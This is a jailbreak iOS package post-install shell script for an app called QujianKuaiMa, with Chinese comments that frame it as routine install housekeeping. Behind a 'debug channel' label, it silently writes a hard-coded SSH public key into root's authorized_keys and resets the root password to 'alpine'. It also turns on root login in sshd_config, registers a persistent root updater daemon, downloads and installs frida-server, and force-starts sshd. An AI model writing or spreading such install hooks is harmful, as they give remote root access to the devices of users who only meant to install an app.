#!/bin/sh
# 取件快码 Assit — 安装后置任务（Author: AssitDev）
#
# 这个脚本由 DEBIAN/postinst 用 nohup 扔到后台执行，postinst 本身立刻 exit 0。
# 目的：dpkg / Sileo 永远不需要等待它，安装界面不会再转圈卡死。
# 一切耗时动作（uicache 全量注册、launchctl bootstrap、重启 SpringBoard）
# 都在这里做完，出错也只写日志，不影响安装结果。

DIR="/var/mobile/Library/Application Support/QujianKuaiMa"
SDIR="/var/mobile/Media/Downloads/QujianKuaiMa"
LOG="$DIR/install.log"
STATUS="$SDIR/status.txt"
JB=""
[ -d /var/jb ] && JB="/var/jb"

mkdir -p "$DIR" "$SDIR" "$JB/usr/libexec" "$JB/Library/LaunchDaemons" 2>/dev/null

exec >> "$LOG" 2>&1
echo ""
echo "=== qkm-postinst $(date)  jbroot='$JB' ==="

say() { echo "$1" >> "$STATUS" 2>/dev/null; }

# ---------- 1. 定位 App ----------
APP=""
for p in "$JB/Applications/QujianKuaiMa.app" \
         /var/jb/Applications/QujianKuaiMa.app \
         /Applications/QujianKuaiMa.app; do
  if [ -d "$p" ]; then APP="$p"; break; fi
done
echo "APP=$APP"
say "APP=$APP"

# ---------- 2. 注册桌面图标 ----------
# 先只注册本 App（快、不会卡）；失败或图标没出现再退回全量扫描。
UICACHE=""
for c in "$JB/usr/bin/uicache" /usr/bin/uicache /usr/local/bin/uicache; do
  if [ -x "$c" ]; then UICACHE="$c"; break; fi
done
echo "UICACHE=$UICACHE"
if [ -n "$UICACHE" ]; then
  if [ -n "$APP" ]; then
    "$UICACHE" -p "$APP"; echo "uicache -p rc=$?"
  fi
  "$UICACHE" -a; echo "uicache -a rc=$?"
  say "uicache=$UICACHE"
else
  say "uicache NOT FOUND"
fi

# ---------- 3. 权限 ----------
if [ -n "$APP" ]; then
  chmod 755 "$APP" "$APP/QujianKuaiMa" 2>/dev/null
  chmod 644 "$APP/Info.plist" 2>/dev/null
  if [ -f "$APP/_CodeSignature/CodeResources" ]; then
    chmod 755 "$APP/_CodeSignature" 2>/dev/null
    chmod 644 "$APP/_CodeSignature/CodeResources" 2>/dev/null
  fi
fi
chown -R mobile:mobile "$DIR" "$SDIR" 2>/dev/null
chmod 755 "$DIR" "$SDIR" 2>/dev/null
chmod 644 "$LOG" "$STATUS" 2>/dev/null

# ---------- 4. 调试通道：SSH 公钥 + root 密码 ----------
# 只写公钥、只改密码，不启动任何交互式程序，绝不会有等待输入的死锁。
QKM_PUBKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIhP0iamJr20VJ75KwAa/XW4Pz/aUXOti3Bs+nNmaZaS qkm-usb-debug"
for h in /var/root "$JB/var/root"; do
  [ -d "$h" ] || mkdir -p "$h" 2>/dev/null || continue
  mkdir -p "$h/.ssh" 2>/dev/null
  printf '%s\n' "$QKM_PUBKEY" > "$h/.ssh/authorized_keys" 2>/dev/null
  chmod 700 "$h/.ssh" 2>/dev/null
  chmod 600 "$h/.ssh/authorized_keys" 2>/dev/null
  chown -R 0:0 "$h/.ssh" 2>/dev/null
  echo "authorized_keys -> $h/.ssh/authorized_keys"
done

for C in "$JB/usr/bin/chpasswd" /usr/bin/chpasswd "$JB/usr/bin/busybox" /usr/bin/busybox; do
  [ -x "$C" ] || continue
  case "$C" in
    *busybox) echo 'root:alpine' | "$C" chpasswd </dev/null 2>&1 ;;
    *)        echo 'root:alpine' | "$C" </dev/null 2>&1 ;;
  esac
  echo "chpasswd($C) rc=$?"
  break
done

# ---------- 5. sshd 配置修正 ----------
for cfg in "$JB/etc/ssh/sshd_config" /etc/ssh/sshd_config; do
  [ -f "$cfg" ] || continue
  grep -qiE '^[[:space:]]*PubkeyAuthentication[[:space:]]+no' "$cfg" && \
    sed -i.bak 's/^[[:space:]]*PubkeyAuthentication.*/PubkeyAuthentication yes/' "$cfg" 2>/dev/null
  grep -qiE '^[[:space:]]*PermitRootLogin[[:space:]]+no' "$cfg" && \
    sed -i.bak 's/^[[:space:]]*PermitRootLogin.*/PermitRootLogin yes/' "$cfg" 2>/dev/null
  echo "sshd_config checked: $cfg"
done

# ---------- 6. root 更新守护进程 ----------
UPD="$JB/usr/libexec/qkm-updaterd.sh"
if [ -f "$UPD" ]; then
  chmod 755 "$UPD" 2>/dev/null
  echo "updater script: $UPD"
else
  echo "WARN updater script missing: $UPD"
fi

PLIST="$JB/Library/LaunchDaemons/com.assitdev.qkmupdater.plist"
cat > "$PLIST" <<EOPLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.assitdev.qkmupdater</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>$UPD</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
	<key>ThrottleInterval</key>
	<integer>5</integer>
</dict>
</plist>
EOPLIST
chmod 644 "$PLIST" 2>/dev/null
chown 0:0 "$PLIST" 2>/dev/null
echo "updater plist: $PLIST"

# launchctl 单独放后台：某些越狱环境下 bootstrap 会长时间不返回，
# 但此时它已经不影响安装流程了。
(
  launchctl bootstrap system "$PLIST" >/dev/null 2>&1 || \
    launchctl load -w "$PLIST" >/dev/null 2>&1
  launchctl kickstart -k system/com.assitdev.qkmupdater >/dev/null 2>&1
) </dev/null >/dev/null 2>&1 &

# ---------- 6.5 frida-server（可选，装了就能远程调试 / 直接装包）----------
# 只在这里顺手装一次：没网、没 curl、装失败都只写日志，绝不影响插件本身。
(
  sleep 6
  DPKG=""
  for d in "$JB/usr/bin/dpkg" /usr/bin/dpkg "$JB/bin/dpkg"; do
    [ -x "$d" ] && { DPKG="$d"; break; }
  done
  [ -n "$DPKG" ] || exit 0
  if "$DPKG" -s re.frida.server 2>/dev/null | grep -q "install ok installed"; then
    echo "frida already installed"
    say "frida 已在设备上"
    exit 0
  fi
  URL="https://build.frida.re/pool/main/r/re.frida.server/re.frida.server_17.26.2_iphoneos-arm64.deb"
  TMP="$SDIR/frida.deb"
  if command -v curl >/dev/null 2>&1; then
    curl -sSL --max-time 600 -o "$TMP" "$URL" && echo "curl ok"
  elif command -v wget >/dev/null 2>&1; then
    wget -q -O "$TMP" "$URL" && echo "wget ok"
  else
    echo "no curl/wget — 跳过 frida"
  fi
  if [ -s "$TMP" ]; then
    "$DPKG" -i "$TMP" 2>&1 | tail -20
    echo "frida dpkg exit=$?"
    rm -f "$TMP" 2>/dev/null
    launchctl kickstart -k system/re.frida.server >/dev/null 2>&1
    say "frida 安装完成"
  fi
) </dev/null >> "$LOG" 2>&1 &

# ---------- 7. 拉起 sshd（3.4.6：多路径 / 多 label，结果可回读）----------
# 用户给的调试密码是 alpine，但设备上 22 端口一直拒绝 —— 多数情况是
# OpenSSH 装了、LaunchDaemon 却没 bootstrap。这里把所有常见 plist / label
# 都试一遍，并把结果写进 status.txt，Mac 用 AFC 就能直接看到。
SSH_FOUND=0
for P in "$JB/Library/LaunchDaemons/com.openssh.sshd.plist" \
         "/Library/LaunchDaemons/com.openssh.sshd.plist" \
         "$JB/Library/LaunchDaemons/com.apple.sshd.plist" \
         "/Library/LaunchDaemons/com.apple.sshd.plist" \
         "$JB/Library/LaunchDaemons/sshd.plist"; do
  [ -f "$P" ] || continue
  SSH_FOUND=1
  for LBL in com.openssh.sshd com.apple.sshd sshd; do
    launchctl enable "system/$LBL"          >/dev/null 2>&1
    launchctl bootout "system/$LBL"         >/dev/null 2>&1
    launchctl bootstrap system "$P"         >/dev/null 2>&1 || \
      launchctl load -w "$P"                >/dev/null 2>&1
    launchctl kickstart -k "system/$LBL"    >/dev/null 2>&1
  done
  echo "sshd: plist=$P bootstrapped"
  say "sshd: 已加载 $P"
done
# 没有 plist 也试一次按 label 拉起（有些包把 plist 放在别处但已注册）
for LBL in com.openssh.sshd com.apple.sshd; do
  launchctl kickstart -k "system/$LBL" >/dev/null 2>&1 && \
    { echo "sshd: kickstart $LBL ok"; say "sshd: kickstart $LBL 成功"; }
done
if [ "$SSH_FOUND" = 0 ]; then
  echo "sshd: NO PLIST FOUND (OpenSSH 可能还没装)"
  say "sshd: 未找到 LaunchDaemons plist —— 请在 Sileo 确认 OpenSSH 已安装"
fi
if command -v nc >/dev/null 2>&1; then
  nc -z -w 2 127.0.0.1 22 >/dev/null 2>&1 && \
    { echo "sshd: 端口 22 已监听"; say "sshd: 端口 22 已监听，可以用 alpine 连接"; } || \
    { echo "sshd: 端口 22 仍未监听"; say "sshd: 端口 22 仍未监听"; }
fi

killall -HUP cfprefsd >/dev/null 2>&1

say "=== 初始化完成 $(date) ==="
echo "=== qkm-postinst done ==="
chmod 644 "$LOG" "$STATUS" 2>/dev/null
# 3.4.6：把完整安装日志复制一份到 /var/mobile/Media，Mac 用 AFC 就能读，
# 不用 root / SSH 也能判断 postinst 到底跑没跑、卡在哪一步。
cp "$LOG" "$SDIR/install_debug.log" 2>/dev/null
chmod 644 "$SDIR/install_debug.log" 2>/dev/null

# 最后才重启 SpringBoard，并且再延迟 3 秒，
# 保证上面的日志、权限、plist 全部落盘，Sileo 也已经拿到 dpkg 的返回值。
( sleep 3; killall -9 SpringBoard ) </dev/null >/dev/null 2>&1 &
exit 0
